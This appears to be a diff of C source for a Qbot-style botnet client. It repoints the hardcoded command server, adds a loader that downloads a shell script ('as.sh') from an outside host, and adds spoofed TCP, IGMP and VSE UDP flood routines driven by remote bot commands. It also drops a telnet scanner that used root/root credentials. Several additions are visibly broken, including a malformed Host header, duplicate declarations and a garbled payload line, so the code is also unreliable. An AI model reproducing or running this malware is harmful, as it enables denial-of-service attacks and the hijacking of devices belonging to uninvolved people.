@@ -1,95 +1,34 @@
-#define PR_SET_NAME 15 //DOESNT REP SKIDZ
-#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
-#define PAD_RIGHT 1
-#define PAD_ZERO 2
-#define PRINT_BUF_LEN 12
-#define CMD_IAC   255
-#define CMD_WILL  251
-#define CMD_WONT  252
-#define CMD_DO    253
-#define CMD_DONT  254
-#define OPT_SGA   3
-#define STD2_SIZE 55
-#define BUFFER_SIZE 512
-#include <stdlib.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <net/if.h>
+#include <netdb.h>
+#include <netinet/if_ether.h>
+#include <netinet/igmp.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#include <pthread.h>
+#include <signal.h>
 #include <stdarg.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <strings.h>
+#include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <sys/types.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <netdb.h>
-#include <signal.h>
-#include <strings.h>
-#include <string.h>
 #include <sys/utsname.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-#include <netinet/tcp.h>
 #include <sys/wait.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
- 
-const char *UserAgents[] = {
-    "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
-    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
-    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
-    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
-    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
-    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
-    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
-    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
-    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
-    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
-    "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
-    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
-    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
-    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
-    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
-    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
-};
- 
- 
-//    ___             __ _
-//   / __\___  _ __  / _(_) __ _
-//  / /  / _ \| '_ \| |_| |/ _` |
-// / /__| (_) | | | |  _| | (_| |
-// \____/\___/|_| |_|_| |_|\__, |
-//                         |___/
+#include <time.h>
+#include <unistd.h>
+
  
 unsigned char *commServer[] =
 {
-        "178.162.199.96:23"
+        "31.58.58.115:666"
 };
- 
-//    ___                 _
-//   / __\   _ _ __   ___| |_(_) ___  _ __  ___
-//  / _\| | | | '_ \ / __| __| |/ _ \| '_ \/ __|
-// / /  | |_| | | | | (__| |_| | (_) | | | \__ \
-// \/    \__,_|_| |_|\___|\__|_|\___/|_| |_|___/
  
 int initConnection();
 int getBogos(unsigned char *bogomips);
@@ -98,31 +37,18 @@ int getCountry(unsigned char *buf, int bufsize);
 void makeRandomStr(unsigned char *buf, int length);
 int sockprintf(int sock, char *formatStr, ...);
 char *inet_ntoa(struct in_addr in);
- 
-//    ___ _       _           _
-//   / _ \ | ___ | |__   __ _| |___
-//  / /_\/ |/ _ \| '_ \ / _` | / __|
-// / /_\\| | (_) | |_) | (_| | \__ \
-// \____/|_|\___/|_.__/ \__,_|_|___/
- 
 int mainCommSock = 0, currentServer = -1, gotIP = 0;
 uint32_t *pids;
 uint32_t scanPid;
 uint64_t numpids = 0;
 struct in_addr ourIP;
 unsigned char macAddress[6] = {0};
-char *usernames[] = {"root\0"};
-char *passwords[] = {"root\0"};
- 
-//    ___  ___  __      __  ___
-//   / __\/ _ \/__\  /\ \ \/ _ \
-//  / _\ / /_)/ \// /  \/ / /_\/
-// / /  / ___/ _  \/ /\  / /_\\
-// \/   \/   \/ \_/\_\ \/\____/
- 
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
- 
+ static unsigned long int Q[4096], c = 362436;
+volatile int limiter;
+volatile unsigned int pps;
+volatile unsigned int sleeptime = 100;
 void init_rand(uint32_t x)
 {
         int i;
@@ -150,12 +76,7 @@ uint32_t rand_cmwc(void)
         return (Q[i] = r - x);
 }
  
-//        _   _ _
-//  /\ /\| |_(_) |___
-// / / \ \ __| | / __|
-// \ \_/ / |_| | \__ \
-//  \___/ \__|_|_|___/
- 
+
 void trim(char *str)
 {
         int i;
@@ -272,7 +193,127 @@ char *makestring() {
     }
     return tmp;
 }
- 
+ #include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <stdlib.h>
+
+#define BUFFER_SIZE 4096
+
+int socket_connect(const char *hostname, int port) {
+    struct hostent *host;
+    struct sockaddr_in addr;
+    int sockfd;
+
+    if ((host = gethostbyname(hostname)) == NULL) {
+        perror("gethostbyname");
+        return -1;
+    }
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr = *((struct in_addr *)host->h_addr);
+    memset(&(addr.sin_zero), 0, 8);
+
+    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
+        perror("connect");
+        close(sockfd);
+        return -1;
+    }
+
+    return sockfd;
+}
+
+void echoLoader() {
+    char buffer[BUFFER_SIZE];
+    int fd;
+    int bytes_read;
+    FILE *f;
+
+    // Connect to server
+    fd = socket_connect("teamspeak4life.cf", 80);
+    if (fd < 0) {
+        printf("Connection failed\n");
+        return;
+    }
+
+    // Build a valid HTTP GET request
+    const char *http_request = 
+        "GET /as.sh HTTP/1.1\r\n"
+        "Host: https://31.58.58,115\r\n"
+        "Connection: close\r\n"
+        "\r\n";
+
+    // Send the HTTP request
+    write(fd, http_request, strlen(http_request));
+
+    // Open file to save response body
+    f = fopen("x", "w");
+    if (!f) {
+        perror("fopen");
+        close(fd);
+        return;
+    }
+
+    // Read response headers first and skip them
+    int header_ended = 0;
+    char *header_end_ptr = NULL;
+    int total_read = 0;
+    char response[BUFFER_SIZE * 10];  // Temporary buffer for headers and part of body
+
+    while ((bytes_read = read(fd, buffer, BUFFER_SIZE - 1)) > 0) {
+        buffer[bytes_read] = '\0';
+        // Append to response buffer
+        if (total_read + bytes_read < sizeof(response)) {
+            memcpy(response + total_read, buffer, bytes_read);
+            total_read += bytes_read;
+            response[total_read] = '\0';
+
+            // Check if headers ended (detect "\r\n\r\n")
+            header_end_ptr = strstr(response, "\r\n\r\n");
+            if (header_end_ptr) {
+                header_ended = 1;
+                break;
+            }
+        } else {
+            // Buffer overflow, break for safety
+            break;
+        }
+    }
+
+    if (!header_ended) {
+        printf("Failed to find end of headers\n");
+        fclose(f);
+        close(fd);
+        return;
+    }
+
+    // Calculate where the body starts
+    int header_len = (header_end_ptr - response) + 4;
+    int body_len = total_read - header_len;
+
+    // Write the body part already read
+    fwrite(response + header_len, 1, body_len, f);
+
+    // Now read the rest of the body and write to file
+    while ((bytes_read = read(fd, buffer, BUFFER_SIZE)) > 0) {
+        fwrite(buffer, 1, bytes_read, f);
+    }
+
+    fclose(f);
+    close(fd);
+
+    printf("Response saved to file 'x'\n");
+}
+
 static int print(unsigned char **out, const unsigned char *format, va_list args )
 {
         register int width, pad;
@@ -577,6 +618,7 @@ int recvLine(int socket, unsigned char *buf, int bufsize)
  
         return count;
 }
+
  
 int connectTimeout(int fd, char *host, int port, int timeout)
 {
@@ -707,57 +749,7 @@ int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutu
         if(found) return 1;
         return 0;
 }
- 
-//   _____  ___         _   _ _
-//   \_   \/ _ \  /\ /\| |_(_) |___
-//    / /\/ /_)/ / / \ \ __| | / __|
-// /\/ /_/ ___/  \ \_/ / |_| | \__ \
-// \____/\/       \___/ \__|_|_|___/
- 
-static uint8_t ipState[5];
-in_addr_t getRandomPublicIP()
-{
-    if(ipState[1] < 255 && ipState[2] < 255 && ipState[3] < 255 && ipState[4] < 255)
-        {
-                ipState[1]++;
-        ipState[2]++;
-        ipState[3]++;
-        ipState[4]++;
-                char ip[16];
-                szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
-        return inet_addr(ip);
-        }
- 
-    ipState[1] = 0;
-    ipState[2] = 0;
-        ipState[3] = 0;
-    ipState[4] = 0;
-        while(
-                (ipState[1] == 0) ||
-                (ipState[1] == 10) ||
-                (ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 169)) ||
-                (ipState[1] == 169 && ipState[2] == 254) ||
-                (ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
-                (ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
-                (ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
-                (ipState[1] == 192 && ipState[2] == 168) ||
-                (ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
-                (ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
-                (ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
-                (ipState[1] >= 224)
-        )
-        {
-                ipState[1] = rand() % 255;
-            ipState[2] = rand() % 255;
-            ipState[3] = rand() % 255;
-        ipState[4] = rand() % 255;
-        }
- 
-    char ip[16];
-        szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
-    return inet_addr(ip);
-}
- 
+
 in_addr_t getRandomIP(in_addr_t netmask)
 {
         in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
@@ -820,7 +812,85 @@ int sclose(int fd)
         close(fd);
         return 0;
 }
+ void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
+{
+        register unsigned int pollRegister;
+        pollRegister = pollinterval;
  
+        struct sockaddr_in dest_addr;
+ 
+        dest_addr.sin_family = AF_INET;
+        if(port == 0) dest_addr.sin_port = rand_cmwc();
+        else dest_addr.sin_port = htons(port);
+        if(getHost(target, &dest_addr.sin_addr)) return;
+        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+ 
+        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+        if(!sockfd)
+        {
+                sockprintf(mainCommSock, "Failed opening raw socket.");
+                return;
+        }
+ 
+        int tmp = 1;
+        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
+        {
+                sockprintf(mainCommSock, "Failed setting raw headers mode.");
+                return;
+        }
+ 
+        in_addr_t netmask;
+ 
+        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
+        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
+ 
+        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
+        struct iphdr *iph = (struct iphdr *)packet;
+        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
+ 
+        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
+ 
+        tcph->source = htons(rand_cmwc() % 65535);
+        tcph->seq = rand_cmwc();
+        tcph->ack_seq = rand_cmwc();
+        tcph->res2 = 0;
+        tcph->doff = 5;
+        tcph->ack = 1; 
+        tcph->syn = 1;
+        tcph->rst = 1;
+        tcph->window = rand_cmwc();
+        tcph->check = 0;
+	tcph->urg_ptr = 0;
+        tcph->dest = htons(port == 0 ? (rand_cmwc() % 65535) : port);
+        tcph->check = tcpcsum(iph, tcph);
+ 
+        iph->check = csum ((unsigned short *) packet, iph->tot_len);
+        int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize;
+        int end = time(NULL) + timeEnd;
+        register unsigned int i = 0;
+        while(1)
+        {
+                sendto(sockfd, packet, packet_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+ 
+                iph->saddr = htonl( getRandomIP(netmask) );
+                iph->id = rand_cmwc();
+                tcph->seq = rand_cmwc() & 0xFFFF;
+                tcph->source = htons(rand_cmwc() & 0xFFFF);
+                tcph->check = 0;
+                tcph->check = tcpcsum(iph, tcph);
+                iph->check = csum ((unsigned short *) packet, iph->tot_len);
+ 
+                if(i == pollRegister)
+                {
+                        if(time(NULL) > end) break;
+                        i = 0;
+                        continue;
+                }
+                i++;
+        }
+}
+
 
 int socket_connect(char *host, in_port_t port)
 {
@@ -838,8 +908,101 @@ int socket_connect(char *host, in_port_t port)
     return sock;
 }
  
- 
-void sendSTD(unsigned char *ip, int port, int secs) {
+ int randnum(int min_num, int max_num)
+{
+    int result = 0, low_num = 0, hi_num = 0;
+
+    if (min_num < max_num)
+    {
+        low_num = min_num;
+        hi_num = max_num + 1;
+    } else {
+        low_num = max_num + 1;
+        hi_num = min_num;
+    }
+
+
+    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
+    return result;
+}
+void setup_ip_header(struct iphdr *iph, uint32_t saddr, uint32_t daddr)
+{
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct igmp));
+    iph->id = htons(rand_cmwc() % 65535);
+    iph->frag_off = htons(0x4000);
+    iph->ttl = randnum(100, 130);
+    iph->protocol = IPPROTO_IGMP;
+    iph->check = 0;
+    iph->saddr = saddr;
+    iph->daddr = daddr;
+}
+
+void setup_igmp_header(struct igmp *igmph, struct in_addr group)
+{
+    static int types[2] = {0x16, 0x17};  // IGMP Membership Reports
+    static int codes[6] = {0x13, 0x14, 0x15, 0x1e, 0x1f, 0x30};
+
+    igmph->igmp_type = types[randnum(0, 1)];
+    igmph->igmp_code = codes[randnum(0, 5)];
+    igmph->igmp_cksum = 0;
+    igmph->igmp_group = group;
+    igmph->igmp_cksum = csum((unsigned short *)igmph, sizeof(struct igmp));
+}
+
+void sendIGMP(unsigned char *target, int timeEnd, int spoofit, int pollinterval)
+{
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    if (getHost(target, &dest_addr.sin_addr)) return;
+    memset(dest_addr.sin_zero, 0, sizeof(dest_addr.sin_zero));
+
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
+    if (sockfd < 0) return;
+
+    int tmp = 1;
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
+        close(sockfd);
+        return;
+    }
+
+    in_addr_t netmask = (spoofit == 0) ? ~((in_addr_t)0) : ~((1 << (32 - spoofit)) - 1);
+
+    unsigned char packet[sizeof(struct iphdr) + sizeof(struct igmp)];
+    struct iphdr *iph = (struct iphdr *)packet;
+    struct igmp *igmph = (struct igmp *)(packet + sizeof(struct iphdr));
+    struct in_addr group_addr;
+    inet_aton(target, &group_addr);
+
+    int end = time(NULL) + timeEnd;
+    register unsigned int i = 0;
+
+    while (1) {
+        if (time(NULL) > end) break;
+
+        memset(packet, 0, sizeof(packet));
+        uint32_t spoofed_ip = htonl(GRIP(netmask));
+
+        setup_ip_header(iph, spoofed_ip, dest_addr.sin_addr.s_addr);
+        setup_igmp_header(igmph, group_addr);
+
+        iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));
+
+        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+
+        if (i++ == pollinterval) {
+            i = 0;
+            usleep(1000);
+        }
+    }
+
+    close(sockfd);
+}
+
+void sendSTD(unsigned char *ip, int port, int secs) 
+{
  
     int iSTD_Sock;
  
@@ -985,86 +1148,119 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int pack
                 }
         }
 }
- 
-void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
+
+ void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
 {
-        register unsigned int pollRegister;
-        pollRegister = pollinterval;
- 
-        struct sockaddr_in dest_addr;
- 
-        dest_addr.sin_family = AF_INET;
-        if(port == 0) dest_addr.sin_port = rand_cmwc();
-        else dest_addr.sin_port = htons(port);
-        if(getHost(target, &dest_addr.sin_addr)) return;
-        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
- 
-        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-        if(!sockfd)
-        {
-                sockprintf(mainCommSock, "Failed opening raw socket.");
-                return;
-        }
- 
-        int tmp = 1;
-        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
-        {
-                sockprintf(mainCommSock, "Failed setting raw headers mode.");
-                return;
-        }
- 
-        in_addr_t netmask;
- 
-        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
-        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
- 
-        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
-        struct iphdr *iph = (struct iphdr *)packet;
-        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
- 
-        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
- 
-        tcph->source = rand_cmwc();
-        tcph->seq = rand_cmwc();
-        tcph->ack_seq = rand_cmwc();
-        tcph->res2 = 0;
-        tcph->doff = 5;
-        tcph->ack = 1;
-	      tcph->window = htons(65535);
-	      tcph->check = 0;
-	      tcph->urg_ptr = 0;
-        tcph->window = rand_cmwc();
-        tcph->check = 0;
-        tcph->urg_ptr = 0;
-        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
-        tcph->check = tcpcsum(iph, tcph);
- 
-        iph->check = csum ((unsigned short *) packet, iph->tot_len);
- 
-        int end = time(NULL) + timeEnd;
-        register unsigned int i = 0;
-        while(1)
-        {
-                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
- 
-                iph->saddr = htonl( getRandomIP(netmask) );
-                iph->id = rand_cmwc();
-                tcph->seq = rand_cmwc() & 0xFFFF;
-                tcph->source = htons(rand_cmwc() & 0xFFFF);
-                tcph->check = 0;
-                tcph->check = tcpcsum(iph, tcph);
-                iph->check = csum ((unsigned short *) packet, iph->tot_len);
- 
-                if(i == pollRegister)
-                {
-                        if(time(NULL) > end) break;
-                        i = 0;
-                        continue;
-                }
-                i++;
-        }
+    char *vse_payload;
+    int vse_payload_len;
+    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
+        iph->ihl = 5;
+        iph->version = 4;
+        iph->tos = 0;
+        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
+        iph->id = rand_cmwc();
+        iph->frag_off = 0;
+        iph->ttl = MAXTTL;
+        iph->protocol = protocol;
+        iph->check = 0;
+        iph->saddr = source;
+        iph->daddr = dest;
 }
- 
+void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
+{
+    char *vse_payload;
+    int vse_payload_len;
+    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
+	struct sockaddr_in dest_addr;
+	dest_addr.sin_family = AF_INET;
+	if(port == 0) dest_addr.sin_port = rand_cmwc();
+	else dest_addr.sin_port = htons(port);
+	if(getHost(target, &dest_addr.sin_addr)) return;
+	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+	register unsigned int pollRegister;
+	pollRegister = pollinterval;
+	if(spoofit == 32) {
+	int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if(!sockfd) {
+	return;
+	}
+	unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
+	if(buf == NULL) return;
+	memset(buf, 0, packetsize + 1);
+	makeRandomStr(buf, packetsize);
+	int end = time(NULL) + timeEnd;
+	register unsigned int i = 0;
+	register unsigned int ii = 0;
+	while(1) {
+	sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+	if(i == pollRegister) {
+	if(port == 0) dest_addr.sin_port = rand_cmwc();
+	if(time(NULL) > end) break;
+	i = 0;
+	continue;
+					}
+	i++;
+	if(ii == sleepcheck) {
+	usleep(sleeptime*1000);
+	ii = 0;
+	continue;
+					}
+	ii++;
+			}
+			} else {
+	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+	if(!sockfd) {
+	return;
+				}
+	int tmp = 1;
+	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
+	return;
+				}
+	int counter = 50;
+	while(counter--) {
+	srand(time(NULL) ^ rand_cmwc());
+				}
+	in_addr_t netmask;
+	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
+	else netmask = ( ~((1 << (32 - spoofit)) - 1) );
+	unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
+	struct iphdr *iph = (struct iphdr *)packet;
+	struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
+	makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
+	udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
+	udph->source = rand_cmwc();
+	udph->dest = (port == 0 ? rand_cmwc() : htons(port));
+	udph->check = 0;
+	udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
+	makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
+	iph->check = csum ((unsigned short *) packet, iph->tot_len);
+	int end = time(NULL) + timeEnd;
+	register unsigned int i = 0;
+	register unsigned int ii = 0;
+	while(1) {
+	sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+	udph->source = rand_cmwc();
+	udph->dest = (port == 0 ? rand_cmwc() : htons(port));
+	iph->id = rand_cmwc();
+	iph->saddr = htonl( getRandomIP(netmask) );
+	iph->check = csum ((unsigned short *) packet, iph->tot_len);
+	if(i == pollRegister) {
+	if(time(NULL) > end) break;
+	i = 0;
+	continue;
+			}
+	i++;
+	if(ii == sleepcheck) {
+	usleep(sleeptime*1000);
+	ii = 0;
+	continue;
+				}
+	ii++;
+			}
+		}
+	}
+
+
 void processCmd(int argc, unsigned char *argv[])
 {
     int x;
@@ -1079,38 +1275,63 @@ void processCmd(int argc, unsigned char *argv[])
                 sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
                 return;
         }
- 
-        if(!strcmp(argv[0], "SCANNER"))
-        {
-                if(argc != 2)
-                {
-                        sockprintf(mainCommSock, "SCANNER ON | OFF");
-                        return;
-                }
- 
-                if(!strcmp(argv[1], "OFF"))
-                {
-                        if(scanPid == 0) return;
-                        kill(scanPid, 9);
-                        printf("SCANNER STOPPED!\n");
-                        scanPid = 0;
-                }
- 
-                if(!strcmp(argv[1], "ON"))
-                {
-                        if(scanPid != 0) return;
-                        uint32_t parent;
-                        parent = fork();
-                        printf("SCANNER STARTED!\n");
-                        if (parent > 0) { scanPid = parent; return;}
-                        else if(parent == -1) return;
- 
-                        StartTheLelz();
+ if(!strcmp(argv[0], "VSE")) {
+            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
+            return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = atoi(argv[4]);
+            int packetsize = atoi(argv[5]);
+            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
+            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
+            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                         _exit(0);
-                           }
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                _exit(0);
+            }
         }
- 
- 
+        return;
+        }
+     
+ if (!strcmp(argv[0], "IGMP")) {
+    if (argc < 4 || atoi(argv[2]) <= 0 || atoi(argv[3]) < 0 || atoi(argv[3]) > 32) {
+        sockprintf(mainCommSock, "Usage: IGMP <target> <time> <netmask (0-32)> (pollinterval default 10)");
+        return;
+    }
+
+    unsigned char *ip = argv[1];
+    int time = atoi(argv[2]);
+    int spoofed = atoi(argv[3]);
+    int pollinterval = (argc > 4) ? atoi(argv[4]) : 10;
+
+    if (strstr(ip, ",") != NULL) {
+        unsigned char *hi = strtok(ip, ",");
+        while (hi != NULL) {
+            if (!listFork()) {
+                sendIGMP(hi, time, spoofed, pollinterval);
+                _exit(0);
+            }
+            hi = strtok(NULL, ",");
+        }
+    } else {
+        if (listFork()) return;
+        sendIGMP(ip, time, spoofed, pollinterval);
+        _exit(0);
+    }
+}
+
         if(!strcmp(argv[0], "UDP"))
